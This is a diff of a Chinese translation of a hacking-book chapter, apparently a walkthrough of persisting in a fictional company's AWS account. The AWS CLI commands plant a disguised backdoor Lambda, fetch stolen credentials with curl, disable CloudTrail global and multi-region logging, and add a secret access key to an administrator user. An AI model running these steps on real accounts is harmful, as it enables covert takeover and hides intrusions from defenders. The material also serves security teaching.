@@ -1,6 +1,4 @@
-# 11
-
-然而，我们依旧坚持了下来
+# 然而，我们依旧坚持了下来
 
 ![](img/chapterart.png)
 
@@ -19,7 +17,7 @@ IAM 访问分析器会标记每个授予外部实体读/写权限的策略文档
 我们可以快速检查 `eu-west-1` 区域是否生成了任何访问分析器报告：
 
 ```
-root@Point1:~/# **aws accessanalyzer list-analyzers --region=eu-west-1**
+root@Point1:~/# aws accessanalyzer list-analyzers --region=eu-west-1
 { "analyzers": [] }
 ```
 
@@ -58,7 +56,7 @@ CloudTrail 是一项 AWS 服务，它几乎会记录每个 AWS API 调用，采�
 MXR Ads 拥有覆盖所有区域的全球综合日志策略，如清单 11-2 所示。
 
 ```
-root@Point1:~/# **aws cloudtrail describe-trails --region=eu-west-1**
+root@Point1:~/# aws cloudtrail describe-trails --region=eu-west-1
 "trailList": [{
    "IncludeGlobalServiceEvents": true,
    "Name": "Default",
@@ -80,7 +78,7 @@ log-group:CloudTrail/Logs:*",
 这两个功能（CloudTrail Insights 和 IAM Access Analyzer）是对其他现有服务的补充，例如 GuardDuty，它们监视可疑事件，如禁用安全功能（CloudTrail）和与已知恶意域的通信。我们可以使用以下命令检查某个区域是否启用了 GuardDuty：
 
 ```
-root@Point1:~/# **aws guardduty list-detectors --region=eu-west-1**
+root@Point1:~/# aws guardduty list-detectors --region=eu-west-1
 { "DetectorIds": [ "64b5b4e50b86d0c7068a6537de5b770e" ] }
 ```
 
@@ -152,8 +150,8 @@ func HandleRequest(ctx context.Context, name MyEvent) (string, error) {
 我们编译代码，然后将二进制文件压缩：
 
 ```
-root@Point1:lambda/# **make**
-root@Point1:lambda/# **zip function.zip function**
+root@Point1:lambda/# make
+root@Point1:lambda/# zip function.zip function
 ```
 
 现在我们将注意力转向设置 Lambda。
@@ -165,7 +163,7 @@ Lambda 需要一个具有强大 IAM 和 CloudTrail 权限的执行角色，以�
 我们寻找有潜力的候选者，以便用 Lambda AWS 服务进行伪装。请记住，为了伪装一个角色，必须满足两个条件：用户必须能够发起 `sts assume-role` 调用，并且该角色必须允许该用户进行伪装。我们列出了 MXR Ads AWS 账户中的可用角色：
 
 ```
-root@Point1:~/# **aws iam list-roles \**
+root@Point1:~/# aws iam list-roles \
 **| jq -r '.Roles[] | .RoleName + ", " + \**
 **.AssumeRolePolicyDocument.Statement[].Principal.Service' \**
 **| grep "lambda.amazonaws.com"**
@@ -178,7 +176,7 @@ chef-cleanup-ro, lambda.amazonaws.com
 我们检查每个角色的 IAM 策略，直到找到一个具有我们所需权限的角色——理想情况下是完全的 IAM 和 CloudTrail 访问权限：
 
 ```
-root@Point1:~/# **aws iam list-attached-role-policies --role dynamo-ssh-mgmt --profile jenkins**
+root@Point1:~/# aws iam list-attached-role-policies --role dynamo-ssh-mgmt --profile jenkins
 
 "AttachedPolicies": [
      "PolicyName": IAMFullAccess",
@@ -192,7 +190,7 @@ root@Point1:~/# **aws iam list-attached-role-policies --role dynamo-ssh-mgmt --p
 一如既往，我们通过遵循现有的命名约定来试图隐匿在明处。我们查看 `eu-west-1` 区域中现有的 Lambda 函数，以寻求灵感：
 
 ```
-root@Point1:~/# **aws iam lambda list-functions –region=eu-west-1**
+root@Point1:~/# aws iam lambda list-functions –region=eu-west-1
 "FunctionName": "support-bbs-news",
 "FunctionName": "support-parse-logs",
 "FunctionName": "ssp-streaming-format",
@@ -202,7 +200,7 @@ root@Point1:~/# **aws iam lambda list-functions –region=eu-west-1**
 我们决定使用名称 `support-metrics-calc`，并调用 `create-function` API 来注册我们的后门 Lambda：
 
 ```
-root@Point1:~/# **aws lambda create-function --function-name support-metrics-calc \**
+root@Point1:~/# aws lambda create-function --function-name support-metrics-calc \
 **--zip-file fileb://function.zip \**
 **--handler function \**
 **--runtime go1.x \**
@@ -219,14 +217,14 @@ root@Point1:~/# **aws lambda create-function --function-name support-metrics-cal
 那么，怎么样呢？s4d.mxrads.com 是我们在第八章中查看过的存储所有创意的桶。通过一个快速的 `list-objects-v2` API 调用可以发现，更新速度相对较慢，每天在 50 到 100 个文件之间：
 
 ```
-root@Point1:~/# **aws s3api list-objects-v2 --bucket s4d.mxrads.com > list_keys.txt**
+root@Point1:~/# aws s3api list-objects-v2 --bucket s4d.mxrads.com > list_keys.txt
  "Key": "2aed773247f0211803d5e67b/82436/vid/720/6aa58ec9f77aca497f90c71c85ee.mp4",
  "LastModified": "2019-12-14T11:01:48.000Z",
 `--snip--`
 
-root@Point1:~/# **grep -c "2020-12-14" list_keys.txt**
+root@Point1:~/# grep -c "2020-12-14" list_keys.txt
 89
-root@Point1:~/# **grep -c "2020-12-13"** **list_keys.txt**
+root@Point1:~/# grep -c "2020-12-13" **list_keys.txt**
 74
 `--snip--`
 ```
@@ -238,7 +236,7 @@ root@Point1:~/# **grep -c "2020-12-13"** **list_keys.txt**
 我们明确允许 S3 服务调用我们的 Lambda 函数。`statement-id` 参数是一个任意的、唯一的名称：
 
 ```
-root@Point1:~/# **aws lambda add-permission \**
+root@Point1:~/# aws lambda add-permission \
 **--function-name support-metrics-calc \**
 **--region eu-west-1 \**
 **--statement-id s3InvokeLambda12 \**
@@ -252,7 +250,7 @@ root@Point1:~/# **aws lambda add-permission \**
 然后，我们设置桶规则，仅在创建以 `"2"` 前缀开头的对象时触发事件：
 
 ```
-root@Point1:~/# **aws s3api put-bucket-notification-configuration \**
+root@Point1:~/# aws s3api put-bucket-notification-configuration \
 **--region eu-west-1 \**
 **--bucket mxrads-mywebhook \**
 **--profile jenkins \**
@@ -296,14 +294,14 @@ root@Point1:~/# **aws s3api put-bucket-notification-configuration \**
 这是一个简短的示例，展示了我们如何重新配置日志记录以排除全局（IAM、STS 等）和多区域事件：
 
 ```
-root@Point1:~/# **curl https://mxrads-report-metrics.s3-eu-west-1.amazonaws.com/lambda**
+root@Point1:~/# curl https://mxrads-report-metrics.s3-eu-west-1.amazonaws.com/lambda
 
 AWS_ACCESS_KEY_ID=ASIA44ZRK6WSTGTH5GLH
 AWS_SECRET_ACCESS_KEY=1vMoXxF9Tjf2OMnEMU...
 AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEPT...
 
 # We load these ENV variables, then disable CloudTrail global and multiregion logging
-root@Point1:~/# **aws cloudtrail update-trail \**
+root@Point1:~/# aws cloudtrail update-trail \
 **--name default \**
 **--no-include-global-service-events \**
 **--no-is-multi-region \**
@@ -325,7 +323,7 @@ root@Point1:~/# **aws cloudtrail update-trail \**
 与默认管理员策略关联的用户和组很容易成为攻击目标。IAM 用户的访问密钥最多只有两个，因此我们会找到一个拥有一个或零个访问密钥的用户，并继续注入一个我们将秘密拥有的附加密钥。首先，我们列出用户和组：
 
 ```
-root@Point1:~/# **aws iam list-entities-for-policy \**
+root@Point1:~/# aws iam list-entities-for-policy \
 **--policy-arn arn:aws:iam::aws:policy/AdministratorAccess**
 
 UserName: b.daniella
@@ -338,7 +336,7 @@ UserName: d.ressler
 
 ```
 # List access keys. If they have less than 2, there's room for another.
-root@Point1:~/# **aws iam list-access-keys \**
+root@Point1:~/# aws iam list-access-keys \
 **--user b.daniella \**
 **| jq ".AccessKeyMetadata[].AccessKeyId"**
 
@@ -348,7 +346,7 @@ root@Point1:~/# **aws iam list-access-keys \**
 很好，*b.daniella* 只有一个密钥。确定目标后，我们创建一个访问密钥：
 
 ```
-root@Point1:~/# **aws iam create-access-key --user b.daniella**
+root@Point1:~/# aws iam create-access-key --user b.daniella
 UserName: b.daniella,
 AccessKeyId: AKIA44ZRK6WSY37NET32,
 SecretAccessKey: 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,
